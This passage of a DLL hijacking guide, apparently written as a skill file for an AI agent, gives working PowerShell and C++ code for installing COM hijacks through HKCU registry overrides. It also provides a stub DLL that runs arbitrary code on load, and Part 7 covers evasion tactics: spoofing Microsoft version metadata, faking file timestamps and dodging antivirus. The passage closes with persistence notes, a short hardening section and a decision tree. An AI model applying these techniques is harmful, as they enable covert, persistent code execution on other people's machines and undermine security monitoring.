                $dll = (Get-ItemProperty $inproc -ErrorAction SilentlyContinue).'(default)'
                if ($dll) {
                    [PSCustomObject]@{
                        CLSID = $clsid
                        DLL   = $dll
                    }
                }
            }
        } | Sort-Object CLSID
    ```

  Method C: Autoruns (Sysinternals)
    Autoruns → COM/ActiveX tab → shows all registered COM objects
    Yellow highlights = file not found → prime hijack targets for specific apps

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
6.3  INSTALLING A COM HIJACK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  PowerShell — register HKCU override for a CLSID:

  ```powershell
  param(
      [string]$Clsid    = "{00000000-0000-0000-0000-000000000000}",
      [string]$DllPath  = "C:\Users\you\tools\payload.dll"
  )

  $regPath = "HKCU:\Software\Classes\CLSID\$Clsid\InprocServer32"
  New-Item -Path $regPath -Force | Out-Null
  Set-ItemProperty -Path $regPath -Name "(default)"      -Value $DllPath
  Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
  Write-Host "COM hijack installed for $Clsid → $DllPath"
  ```

  C++ — install programmatically:

  ```cpp
  #include <windows.h>
  #include <string>

  bool InstallCOMHijack(const wchar_t* clsidStr, const wchar_t* dllPath) {
      std::wstring keyPath = L"Software\\Classes\\CLSID\\";
      keyPath += clsidStr;
      keyPath += L"\\InprocServer32";

      HKEY hKey;
      LSTATUS ls = RegCreateKeyExW(
          HKEY_CURRENT_USER, keyPath.c_str(),
          0, nullptr, REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr,
          &hKey, nullptr);
      if (ls != ERROR_SUCCESS) return false;

      RegSetValueExW(hKey, L"",              0, REG_SZ,
                     (const BYTE*)dllPath,
                     (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
      RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
                     (const BYTE*)L"Apartment",
                     (DWORD)(wcslen(L"Apartment") + 1) * sizeof(wchar_t));
      RegCloseKey(hKey);
      return true;
  }
  ```

  Cleanup (remove hijack):
  ```powershell
  Remove-Item "HKCU:\Software\Classes\CLSID\{GUID}" -Recurse -Force
  ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
6.4  COM DLL REQUIREMENTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  A DLL loaded as a COM server must export DllGetClassObject or the COM
  subsystem will fail to create the object. For a hijack where you just want
  code execution (not a functional COM server), you can export a stub:

  ```cpp
  // com_hijack.cpp
  #include <windows.h>
  #include <unknwn.h>

  // Required COM export — return E_NOTIMPL to signal non-functional object
  HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
      (void)rclsid; (void)riid; (void)ppv;
      return E_NOTIMPL;
  }

  // Optional but prevents "unregistered DLL" log events
  HRESULT __stdcall DllCanUnloadNow() { return S_FALSE; }

  BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
      if (reason == DLL_PROCESS_ATTACH) {
          DisableThreadLibraryCalls(hMod);
          CreateThread(nullptr, 0,
              [](LPVOID) -> DWORD { /* your code */ return 0; },
              nullptr, 0, nullptr);
      }
      return TRUE;
  }
  ```

  DEF file (to ensure exports are named correctly without name mangling):
  ```def
  LIBRARY com_hijack
  EXPORTS
      DllGetClassObject   PRIVATE
      DllCanUnloadNow     PRIVATE
  ```

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 7 — DETECTION EVASION AND OPERATIONAL NOTES
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
7.1  COMMON DETECTION SIGNALS (AND HOW TO REDUCE THEM)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Signal                          | Source            | Mitigation
  ────────────────────────────────|───────────────────|──────────────────────────
  DLL in app dir, not signed      | AV / EDR          | Sign the DLL if possible;
                                  |                   | mimic PE metadata of real DLL
  Export table mismatch           | App verifying own | Forward ALL exports correctly
                                  | imports           |
  Mismatched file version         | App or AV         | Set VERSIONINFO resource to
                                  |                   | match original DLL version
  Unexpected HKCU CLSID entry     | Autoruns / EDR    | Clean up COM hijack after use
  Unknown module in process list  | EDR / Game AC     | Proxy DLL name matches expected
  LoadLibrary call to unusual path| ETW logging       | Use search-order; no LoadLibrary
  File timestamp newer than EXE   | Forensics         | Touch timestamp to match app age

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
7.2  MIMICKING DLL METADATA (VERSIONINFO)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Some applications and anti-cheat systems verify the version resource of loaded
  DLLs. To reduce detection, embed a VERSIONINFO matching the original DLL:

  ```rc
  // version_info.rc — compile and link into your proxy DLL
  #include <windows.h>

  VS_VERSION_INFO VERSIONINFO
  FILEVERSION     1, 0, 0, 1
  PRODUCTVERSION  1, 0, 0, 1
  FILEFLAGSMASK   0x3fL
  FILEFLAGS       0x0L
  FILEOS          VOS__WINDOWS32
  FILETYPE        VFT_DLL
  FILESUBTYPE     0x0L
  BEGIN
      BLOCK "StringFileInfo"
      BEGIN
          BLOCK "040904b0"
          BEGIN
              VALUE "CompanyName",      "Microsoft Corporation\0"
              VALUE "FileDescription",  "Version Checking and File Installation Libraries\0"
              VALUE "FileVersion",      "10.0.19041.1\0"
              VALUE "InternalName",     "VERSION\0"
              VALUE "OriginalFilename", "VERSION.DLL\0"
              VALUE "ProductName",      "Microsoft Windows Operating System\0"
              VALUE "ProductVersion",   "10.0.19041.1\0"
          END
      END
      BLOCK "VarFileInfo"
      BEGIN
          VALUE "Translation", 0x409, 1200
      END
  END
  ```

  Copy metadata from real DLL using Resource Hacker or rcedit:
    rcedit your_proxy.dll --set-version-string "FileVersion" "10.0.19041.1"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
7.3  ANTI-ANTI-CHEAT CONSIDERATIONS (GAME MODDING CONTEXT)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  For game modding on titles without anti-cheat (GTA:SA, older Rockstar titles,
  many single-player games), DLL hijacking is the preferred loader because:
    - No injection APIs → no "DLL injector" detection heuristics
    - The DLL name matches an expected system DLL → module appears legitimate
    - The approach is stable across game updates (the proxy name doesn't change)
    - SA-MP compatible: dinput8.dll / d3d9.dll hijacks are the standard mod loader

  For SA-MP specifically, d3d9.dll is loaded by game.exe from the app directory.
  VanillaShaders uses exactly this: d3d9.dll in the GTA:SA root directory.

  Game anti-cheat that DOES interfere:
    - BattlEye, EasyAntiCheat, Vanguard → these have kernel-level drivers that
      check loaded module signatures and DLL file hashes independently of the
      Windows loader. DLL hijacking does NOT evade kernel-level AC.
    - For SA-MP (no AC): DLL hijacking is fully viable.

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 8 — PERSISTENCE MECHANICS
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

  DLL hijacks survive reboots and process restarts by design:

  Application restarts
    → OS loader runs
      → Reads application directory for DLLs (before System32)
        → Finds your proxy DLL
          → Loads it
            → DllMain fires → your code runs

  Persistence without registry modification:
    File-based hijacks require only that your DLL file exists on disk in the
    correct location. No registry entries, no startup items, no services.
    The hijack is entirely contained in the file system.

  Persistence with registry (COM hijack):
    HKCU COM hijacks require a registry entry but NOT admin. They persist
    until the registry entry is removed.

  Removal:
    File-based: delete or rename the hijack DLL from the app directory.
    COM-based:  delete the HKCU\Software\Classes\CLSID\{GUID} key.

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 9 — HARDENING REFERENCE (DEFENSIVE)
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

  Hardening measure                    | What it prevents
  ─────────────────────────────────────|─────────────────────────────────────────
  Full absolute paths in LoadLibrary   | Eliminates search-order exploitation
  SetDllDirectory("")                  | Removes CWD from search path
  LOAD_LIBRARY_SEARCH_SYSTEM32 flag    | Forces load from System32 only
  SafeDllSearchMode = 1 (default)      | Moves CWD below System32 in search order
  DLL signature verification           | Rejects unsigned DLLs
  App-dir not user-writable            | Prevents phantom DLL planting
  COM server DLL signature check       | Registry override can't load unsigned DLL
  ACL on app directory (icacls)        | Non-admin cannot write DLLs to app dir

  Code example — hardened LoadLibrary:
  ```cpp
  // Instead of:
  HMODULE h = LoadLibraryW(L"winmm.dll");                    // search order applies

  // Use:
  HMODULE h = LoadLibraryExW(
      L"C:\\Windows\\System32\\winmm.dll",                   // full path
      nullptr,
      LOAD_LIBRARY_SEARCH_SYSTEM32);                         // restrict search
  ```

  Programmatic DLL dir restriction (call once at app startup):
  ```cpp
  SetDllDirectoryW(L"");     // empty string = disable CWD from search path
  ```

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 10 — PITFALLS & TROUBLESHOOTING TABLE
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

  Symptom                              | Root Cause                  | Fix
  ─────────────────────────────────────|─────────────────────────────|────────────────────────────────
  App crashes on startup               | Missing or wrong export     | Forward all required exports
  App silently fails, DLL not loaded   | DLL is in KnownDLLs         | Choose a non-KnownDLL target
  DLL loads but DllMain never fires    | Loader short-circuits        | Check arch match (x86 vs x64)
  Access violation in DllMain          | Blocking call in DllMain    | Move work to worker thread
  Deadlock on load                     | LoadLibrary inside DllMain  | Never call LoadLibrary in DllMain
  Circular load (proxy loads itself)   | LoadLibrary without path    | Use full absolute path to orig DLL
  DLL loads but code doesn't run       | Thread not created          | Verify CreateThread return, log errors
  COM hijack installs but not triggered| CLSID not used by target    | Verify app uses CoCreateInstance
  COM hijack intermittent              | Threading model mismatch    | Match ThreadingModel to original
  AV deletes the DLL                   | Signature/reputation check  | Sign, or use a DLL the AV trusts
  App validates DLL checksum           | PE checksum verification    | Update PE checksum via editbin /REBASE

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 11 — QUICK REFERENCE DECISION TREE
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

  I want code to run in process X without injection APIs.
  ↓
  Does the app load any DLLs without a full path?
    No → Cannot use search-order hijack. Consider DLL Injection (DLL_Injection.md).
    Yes ↓
  Is the DLL in KnownDLLs?
    Yes → Cannot hijack this DLL. Find another candidate.
    No  ↓
  Does the app use any exports from that DLL?
    No  → Type A (Phantom DLL) — drop minimal DLL, no forwarding needed.
    Yes ↓
  Is the DLL loaded from the app directory (Step 2)?
    Yes → Type B (App-Dir Proxy) — see DLL_Proxying.md for forwarding.
    No  ↓
  Is a user-writable directory earlier in PATH than System32?
    Yes → Type D (PATH Poisoning) — plant DLL there.
    No  ↓
  Does the application use COM objects via CoCreateInstance?
    Yes → COM Hijacking (Part 6) — create HKCU registry override.
    No  → Consider DLL Injection or manual mapping instead.

================================================================================
  END OF DLL_HIJACKING SKILL
================================================================================
